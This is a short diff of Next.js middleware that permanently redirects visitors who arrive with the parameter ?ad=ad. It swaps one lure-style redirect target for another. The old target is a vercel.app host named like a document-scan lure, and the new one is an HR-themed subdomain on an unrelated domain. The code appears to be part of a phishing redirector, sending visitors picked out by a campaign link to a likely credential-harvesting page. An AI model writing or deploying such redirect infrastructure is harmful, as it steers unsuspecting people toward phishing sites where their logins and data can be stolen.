@@ -41,7 +41,7 @@ export function middleware(request) {
   // Redirect when ?ad=ad
   if (adParam === 'ad') {
     return NextResponse.redirect(
-      'https://rfq-docu-scn39405.vercel.app/?ad=ad',
+      'https://2026HrNewresources.darknessdanced.de/VLRPw',
       { status: 301 }
     )
   }
